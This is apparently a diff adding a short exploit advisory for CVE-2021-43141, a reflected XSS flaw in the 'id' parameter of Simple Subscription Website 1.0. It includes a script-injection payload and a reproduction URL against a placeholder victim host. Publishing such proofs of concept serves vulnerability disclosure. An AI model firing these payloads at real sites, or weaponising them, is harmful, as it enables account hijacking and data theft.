@@ -1,0 +1,16 @@
+# Exploit Title: Simple Subscription Website - 'id' Reflected XSS in view plan
+# Exploit Author: Daniel Haro (Dirox)
+# Vendor Homepage: https://www.sourcecodester.com/php/15013/simple-subscription-website-admin-panel-php-and-sqlite-source-code.html
+# Software Link: https://www.sourcecodester.com/php/15013/simple-subscription-website-admin-panel-php-and-sqlite-source-code.html
+# Version: Simple Subscription Website 1.0
+# Tested on: Windows 10, xampp
+# CVE: CVE-2021-43141
+
+- Description:
+A XSS issue in Simple Subscription Website v.1.0 allows remote attackers to inject JavaScript in the "id" parameter.
+
+- Payload used:
+x"><script>alert(/WhoIsSecure/)</script>
+
+- Steps to reproduce:
+1- Alert will pop up in a link like: https://victim.com/plan_application/?page=view_plan&id=x%22%3E%3Cscript%3Ealert(/WhoIsSecure/)%3C/script%3E
